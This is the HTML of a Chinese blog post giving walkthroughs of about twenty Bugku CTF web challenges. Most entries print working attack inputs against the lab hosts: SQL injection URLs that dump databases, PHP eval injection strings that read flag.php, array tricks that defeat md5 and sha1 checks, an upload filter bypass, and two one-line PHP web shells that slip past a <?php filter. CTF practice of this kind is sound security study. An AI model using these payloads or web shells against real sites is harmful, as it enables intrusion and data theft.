@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Kage">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Kage">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>bugku个人笔记 · K4ge&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <a class="home-link" href=/>K4ge's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+">
+    
+    <!-- 主页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="1-web2"><a href="#1-web2" class="headerlink" title="1.web2"></a>1.web2</h3><p>直接右键查看元素就能看到flag<br><br>主要还是要养成看源码的习惯<br><img src="/img/3261.jpg" alt=""></p>
+<h3 id="2-文件上传测试"><a href="#2-文件上传测试" class="headerlink" title="2.文件上传测试"></a>2.文件上传测试</h3><p>上传php说非图片文件,上传图片说非php文件,应该是一个上传绕过，通过burpsuit抓包改文件名后缀轻松绕过。<br><br><img src="/img/3262.png" alt=""></p>
+<h3 id="3-计算器"><a href="#3-计算器" class="headerlink" title="3.计算器"></a>3.计算器</h3><p>谷歌浏览器F12修改样式，轻松绕过<br><br>用户是可以通过浏览器修改前端代码的，所以类似通过js或者html的过滤限制是可以用同样方法绕过<br><img src="/img/3263.png" alt=""></p>
+<h3 id="4-矛盾"><a href="#4-矛盾" class="headerlink" title="4.矛盾"></a>4.矛盾</h3><p>简单的numeric绕过，输入num=1*0轻松绕过<br></p>
+<ol>
+<li>is_numeric(“1*0”) false</li>
+<li>is_numeric(“1x0”) false</li>
+<li>is_numeric(1*0) true</li>
+<li>is_numeric(0x1) true</li>
+<li>is_numeric(“0x1”) true</li>
+<li>is_numeric(0e1231) true</li>
+</ol>
+<h3 id="5-WEB3"><a href="#5-WEB3" class="headerlink" title="5.WEB3"></a>5.WEB3</h3><p>查看源码看到这一串<img src="/img/3271.png" alt=""><br><br>进行html解码得到flag：KEY{J2sa42ahJK-HS11III}</p>
+<h3 id="6-SQL测试"><a href="#6-SQL测试" class="headerlink" title="6.SQL测试"></a>6.SQL测试</h3><p>查看源码看到这一段<br><br><img src="/img/3272.png" alt=""><br><br>可以考虑宽字节注入，用%bf吃掉%5c，ok，果然报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%bf&apos;</span><br></pre></td></tr></table></figure>
+<p>其他and 1=1 ，测字段老套路了，下面报数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select schema_name,2 from information_schema.schemata--+</span><br></pre></td></tr></table></figure></p>
+<p>报表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select table_name,2 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+<p>报列名，这里一开始表名我是尝试’key’,结果被转义，所以可以用16进制绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select column_name,2 from information_schema.columns where table_name=0x6b6579--+</span><br></pre></td></tr></table></figure>
+<p>最后报数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select string,2 from sql5.key --+</span><br></pre></td></tr></table></figure>
+<h3 id="7-域名解析"><a href="#7-域名解析" class="headerlink" title="7.域名解析"></a>7.域名解析</h3><p>进入kali，vi更改/etc/hosts文件，增加如下内容<br><br>120.24.86.145 flag.bugku.com<br><br><img src="/img/3273.png" alt=""><br><br>访问flag.bugku.com 得到flag<br><br><img src="/img/3274.png" alt=""><br></p>
+<h3 id="8-SQL注入1"><a href="#8-SQL注入1" class="headerlink" title="8.SQL注入1"></a>8.SQL注入1</h3><p>关键函数strip_tags($id)：从字符串中去除 HTML 和 PHP 标记，<br>所以可以在过滤的字段中加&lt;&gt;，也可以%00截断。<br><br><br>1=1，1=2分析出后台sql语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=1 an%00d 1=2 #</span><br></pre></td></tr></table></figure></p>
+<p>其他类似上面的，直接报数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1 uni%00on sel%00ect 1,hash fro%00m sql3.key --+</span><br></pre></td></tr></table></figure>
+<h3 id="9-你必须让他停下来"><a href="#9-你必须让他停下来" class="headerlink" title="9.你必须让他停下来"></a>9.你必须让他停下来</h3><p>放到burpsuit重放，go几次就出flag了<br><img src="/img/3275.png" alt=""><br></p>
+<h3 id="10-本地包含"><a href="#10-本地包含" class="headerlink" title="10.本地包含"></a>10.本地包含</h3><p>看题目一开始以为是文件包含，进去以后包含了几个文件无果，代码审计一波看到关键函数eval( “var_dump($a);”); 典型的php代码执行漏洞。<br><br><br>下面各种获取源码姿势<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;hell=);show_source(&quot;flag.php&quot;);//</span><br><span class="line">&lt;2&gt;hello=file(&quot;flag.php&quot;)</span><br><span class="line">&lt;3&gt;hello=);include(&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><br><span class="line">&lt;4&gt;hello=);print_r(file(&quot;flag.php&quot;)</span><br><span class="line">&lt;5&gt;hello=);include(@$_POST[&apos;b&apos;]</span><br><span class="line">    在POST区域：b=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
+<h3 id="11-变量1"><a href="#11-变量1" class="headerlink" title="11.变量1"></a>11.变量1</h3><p>又是一道php代码执行，关注这句代码<br><br>eval(“var_dump($$args);”);<br><br>用户所能控制的只有变量名，直接输入GLOBALS爆出所有全局变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure>
+<h3 id="12-web5"><a href="#12-web5" class="headerlink" title="12.web5"></a>12.web5</h3><p>右键查看源码看到一堆括号，我也不知道是什么东西，网上查是JSPFUCK，F12，扔进控制器执行得到flag<br><img src="/img/3277.png" alt=""><br></p>
+<h3 id="13-头等舱"><a href="#13-头等舱" class="headerlink" title="13.头等舱"></a>13.头等舱</h3><p>抓响应包直接给我们flag了…<br><br><img src="/img/3278.png" alt=""><br></p>
+<h3 id="14-flag在index里"><a href="#14-flag在index里" class="headerlink" title="14.flag在index里"></a>14.flag在index里</h3><p>click进去，看url<br><br><img src="/img/3279.png" alt=""><br><br><br>应该是文件包含漏洞，那flag在哪里呢<br>试试包含test5、flag.php无果<br>php://input试试，返回Oh no！<br>最后试试php流filter，成功!</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>得到base64的源码，去burp解码一下就得到flag啦。<br><img src="/img/32711.png" alt=""><br></p>
+<h3 id="15-请输入密码查看flag"><a href="#15-请输入密码查看flag" class="headerlink" title="15.请输入密码查看flag"></a>15.请输入密码查看flag</h3><p>请输入5位数字密码查看，那还用说，直接burp爆破<br><br><img src="/img/32712.png" alt=""><br></p>
+<h3 id="16-点击一百万次"><a href="#16-点击一百万次" class="headerlink" title="16.点击一百万次"></a>16.点击一百万次</h3><p>这题应该是有两个地方有检查，<br>一个是前端的js检查，要大于一百万才能发出请求的数据包。</p>
+<p>因此我们把clicks改为1，这样点一下就能玩一年啦。<br><img src="/img/32713.png" alt=""><br><br>OK，包发出去了，但是服务器没有给我们返回flag，那么应该后端也有检查，burp抓包修改click值，成功！<br><img src="/img/32714.png" alt=""><br><br>得到flag<br><img src="/img/32715.png" alt=""><br></p>
+<h3 id="17-备份是个好习惯"><a href="#17-备份是个好习惯" class="headerlink" title="17.备份是个好习惯"></a>17.备份是个好习惯</h3><p>尝试访问index.php.bak，成功下载文件下来<br><img src="/img/32716.png" alt=""><br><br>运用了两次md5，所以需要构造一下绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2</span><br></pre></td></tr></table></figure>
+<h3 id="18-成绩单"><a href="#18-成绩单" class="headerlink" title="18.成绩单"></a>18.成绩单</h3><p>基于post的union类的sql注入<br>，其他老套路。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/chengjidan/index.php</span><br><span class="line">post：id=-1&apos; union select 1,2,3,skctf_flag from fl4g#</span><br></pre></td></tr></table></figure>
+<h3 id="19-never-give-up"><a href="#19-never-give-up" class="headerlink" title="19.never give up"></a>19.never give up</h3><p>右键源代码，看到1p.html<br><br>直接访问<a href="http://120.24.86.145:8006/test/1p.html，老是跳转到bugku官网，无果" target="_blank" rel="noopener">http://120.24.86.145:8006/test/1p.html，老是跳转到bugku官网，无果</a><br><br>试试直接查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.24.86.145:8006/test/1p.html</span><br></pre></td></tr></table></figure></p>
+<p>得到一串编码过的数据<br><br><img src="/img/32718.png" alt=""><br>经分析，通过url解码，再base64解码，最后还要url解码得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后有个猥琐解法直接访问f4l2a3g.txt就能得到flag了<br><br>耿直解法：<br></p>
+<ul>
+<li>$data==”bugku is a nice plateform!”：可以令a=php://input，然后POST传值 bugku is a nice plateform! 绕过。</li>
+<li>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4：可以利用%00截断，令b=%0012345 绕过。</li>
+<li>!$_GET[‘id’]并且id==0：令id=%00或者令id=.都可以绕过。 </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8006/test/hello.php?a=php://input&amp;b=%0012345&amp;id=.</span><br><span class="line">post:bugku is a nice plateform!</span><br></pre></td></tr></table></figure>
+<p>典型的找源码，解密，代码审计题目</p>
+<h3 id="20-前女友"><a href="#20-前女友" class="headerlink" title="20.前女友"></a>20.前女友</h3><p>查看源代码,<br><img src="/img/32719.png" alt=""><br>有个链接，点击得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123;</span><br><span class="line">    $v1 = $_GET[&apos;v1&apos;];</span><br><span class="line">    $v2 = $_GET[&apos;v2&apos;];</span><br><span class="line">    $v3 = $_GET[&apos;v3&apos;];</span><br><span class="line">    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>md5可以通过数组绕过，strcmp也可以通过数组绕过，构造得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1</span><br></pre></td></tr></table></figure>
+<h3 id="21-各种绕过"><a href="#21-各种绕过" class="headerlink" title="21.各种绕过"></a>21.各种绕过</h3><p>进去看到一串源码<br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&apos;flag.php&apos;);</span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;])</span><br><span class="line"></span><br><span class="line">        print &apos;passwd can not be uname.&apos;;</span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;))</span><br><span class="line"></span><br><span class="line">        die(&apos;Flag: &apos;.$flag);</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line"></span><br><span class="line">        print &apos;sorry!&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>主要是绕过sha1函数，类似md5绕过，提交数组上去就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web7/?uname[]=1&amp;id=margin</span><br><span class="line">post:passwd[]=2</span><br></pre></td></tr></table></figure></p>
+<h3 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h3><p>查看源码，看到<img src="/img/32720.png" alt=""><br>果断包含upload.php,看到上传文件的界面<br><br><img src="/img/32721.png" alt=""><br><br>构造小马，发现过滤了&lt;?php ?&gt;<br><br>可以这样绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后执行<br><br><img src="/img/32722.png" alt=""><br>最后包含flag文件</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/others/zaoqi/bugku个人笔记.html">http://yoursite.com/others/zaoqi/bugku个人笔记.html</a>
+            <p>发表日期：<a href="http://yoursite.com/others/zaoqi/bugku个人笔记.html">July 20th 2019, 5:19:39 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/others/zaoqi/bugku个人笔记.html">February 3rd 2019, 6:38:35 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:543251348@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/K4ge" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 9
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2019/07/20/PHP XXE/" >PHP XXE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
